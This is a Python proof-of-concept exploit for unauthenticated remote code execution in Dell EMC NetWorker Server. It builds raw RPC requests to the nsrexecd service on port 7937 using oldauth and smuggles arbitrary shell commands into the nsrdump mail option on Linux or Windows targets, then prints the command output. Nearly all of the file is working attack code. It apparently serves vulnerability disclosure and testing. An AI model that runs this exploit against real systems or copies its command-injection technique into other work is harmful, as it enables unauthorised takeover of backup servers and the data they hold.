#!/usr/bin/env python3
'''
Proof of concept for unauthenticated remote code execution affecting
Dell EMC Networker Server via nsrdump.

The script connects to nsrexecd remotely as administrative user using
oldauth and call 'nsrdump' script with arbitrary mail command in order
to execute arbitrary commands.

Author: Quentin Kaiser <kaiserquentin@gmail.com>
'''
import sys
import socket
import struct
import re
import string
import random

def add_header(rpc_request):
    '''compute RPC header'''
    rpc_header = struct.pack(">I", 0x80000000 + len(rpc_request))
    return rpc_header + rpc_request

def pad(content, pad_len=4):
    '''4 bytes wide padding'''
    return content + b"\x00" * (pad_len - (len(content) % pad_len))

def rpc_base(oldauth=True):
    '''craft RPC base request'''

    client_hostname = b"\x00" * 16

    # craft_rpc_header
    rpc_request = b""
    rpc_request += struct.pack(">I", 0x5ebb5810) # XID
    rpc_request += struct.pack(">I", 0x00000000) # message_type
    rpc_request += struct.pack(">I", 0x00000002) # rpc version
    rpc_request += struct.pack(">I", 0x0005f3e1) # rpc program
    rpc_request += struct.pack(">I", 0x00000001) # program version
    rpc_request += struct.pack(">I", 0x00000006) # rpc procedure
    rpc_request += struct.pack(">I", 0x00000001) # unknown
    rpc_request += struct.pack(">I", 0x00000030) # unknown
    rpc_request += struct.pack(">I", 0x5ebb5810) # XID

    if oldauth:
        # oldauth, we add the client hostname
        rpc_request += struct.pack(">I", len(client_hostname))
        rpc_request += pad(client_hostname, pad_len=4)

        # TLV
        rpc_request += struct.pack(">I", 0x00000000) # type
        rpc_request += struct.pack(">I", 0x00000000) # length
        rpc_request += struct.pack(">I", 0x00000002) # value

        # TLV
        rpc_request += struct.pack(">I", 0x00000000) # type
        rpc_request += struct.pack(">I", 0x00000000) # length
        rpc_request += struct.pack(">I", 0x00000000) # value

        # TLV
        rpc_request += struct.pack(">I", 0x00000000) # type
        rpc_request += struct.pack(">I", 0x00000001) # length
        rpc_request += struct.pack(">I", 0x00000071) # value

        # unknown
        rpc_request += struct.pack(">I", 0x00000001) # ?
    return rpc_request

def craft_rpc_request(command):
    '''craft rpc command request'''

    instruction = b"command"

    rpc_request = rpc_base()
    # TLV (instruction)
    rpc_request += struct.pack(">I", 0x00000001) # type
    rpc_request += struct.pack(">I", len(instruction)) # length
    rpc_request += pad(instruction)

    # TLV (command)
    rpc_request += struct.pack(">I", 0x00000001) # type
    rpc_request += struct.pack(">I", len(command)) # length
    rpc_request += pad(command)

    rpc_request += struct.pack(">I", 0x00000000)
    rpc_request += struct.pack(">I", 0x00000000)

    rpc_payload = add_header(rpc_request)
    return rpc_payload

def confirm_payload():
    '''confirmation payload'''
    payload = b""
    payload += struct.pack(">I", 0x00000007)
    payload += struct.pack(">I", 0x00000000)
    payload += struct.pack(">I", 0x00000001)
    payload += struct.pack(">I", 0x00000001)
    payload += struct.pack(">I", 0x00000000)
    return payload

def rand_file(_len=10):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(_len))

def rce(host, ucommand, os='linux'):
    '''read file filename from host by exploiting path traversal'''
    dumpfile = rand_file()
    output = b""

    if os == 'linux':
        command = "nsrdump -m root@localhost -o {} -M \"{}; rm /nsr/applogs/rh/{};\"".format(dumpfile, ucommand, dumpfile).encode('utf-8')
    else:
        command = "nsrdump -m root@localhost -o {} -M '{} & del \"C:\\\\Program Files\\\\EMC NetWorker\\\\nsr\\\\applogs\\\\rh\\\\{}\" & '".format(dumpfile, ucommand, dumpfile).encode('utf-8')
    payload = craft_rpc_request(command)

    command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    command_socket.connect((host, 7937))
    command_socket.sendall(payload)
    data = command_socket.recv(1024)
    command_socket.sendall(confirm_payload())
    while True:
        data = command_socket.recv(1024)
        output += data
        if b"\x80\x00\x00\x03\x00\x00\x00\x01" in data:
            command_socket.close()
            break
    command_socket.close()
    return output

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: {} target_ip filename os".format(sys.argv[0]))
        sys.exit(-1)

    rpc_response = rce(sys.argv[1], sys.argv[2], sys.argv[3])
    matches = re.findall(b"([^\x00]+)", rpc_response[24:])
    if matches:
        print(matches[0].decode('utf-8'))
